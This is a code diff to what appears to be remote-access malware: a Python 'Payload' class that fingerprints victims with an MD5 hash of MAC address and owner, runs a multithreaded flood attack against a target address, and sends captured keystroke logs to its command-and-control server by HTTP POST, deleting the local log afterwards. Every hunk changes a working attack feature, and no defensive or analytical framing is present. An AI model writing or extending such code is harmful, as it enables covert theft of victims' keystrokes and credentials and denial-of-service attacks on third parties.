@@ -6,7 +6,9 @@ import socket
 import threading
 import collections
 import os
-from pynput.keyboard import Listener, Key
+import requests
+import hashlib
+from pynput.keyboard import Listener
 
 class Payload():
     def __init__(self, host='0.0.0.0', port=1337, **kwargs):
@@ -48,7 +50,8 @@ class Payload():
         info['mac_address'] = mac_address()
         info['username'] = username()
         info['owner'] = self.owner
-
+        identity = str(info['mac_address'] + info['owner']).encode()
+        info['uid'] = hashlib.md5(identity).hexdigest()
         data = json.dumps(info)
         msg = struct.pack('!L', len(data)) + data.encode('utf-8')
         self.connection.sendall(msg)
@@ -88,7 +91,7 @@ class Payload():
         def run(target_address, target_port=8080):
             stop_event = threading.Event()
             threads = []
-            for _ in range(500):
+            for _ in range(100):
                 thread = threading.Thread(target=attack, args=(target_address, target_port, stop_event))
                 thread.start()
                 threads.append(thread)
@@ -160,17 +163,18 @@ class Payload():
             except: 
                 pass
         elif 'upload' in mode:
-            try:
-                with open(file, 'r') as f:
-                    log = f.read()
-                os.remove(file)
-                data = {'data': str(log), 'owner': self.owner, 'type': 'txt', "module": self.keylogger.__name__, "session": self.info.get('uid')}
-                data = json.dumps(data)
-                msg  = struct.pack('!L', len(data)) + data.encode('utf-8')
-                self.connection.sendall(msg)
-                return 'Keystroke log upload complete'
-            except:
-                return "Error reading log file or no log file found"
+            if 'keylogger' not in self.handlers:
+                try:
+                    with open(file, 'r') as f:
+                        log = f.read()
+                    os.remove(file)
+                    data = {'data': str(log), 'owner': self.owner, 'type': 'txt', "module": self.keylogger.__name__, "session": self.info.get('uid')}
+                    requests.post(f'http://{self.c2[0]}:5000/api/file/add', data=data)
+                    return 'Keystroke log upload complete'
+                except:
+                    return "Error reading log file or no log file found"
+            else:
+                return "Keylogger is still running, please end it first"
             
             
     def send_task_result(self, task):
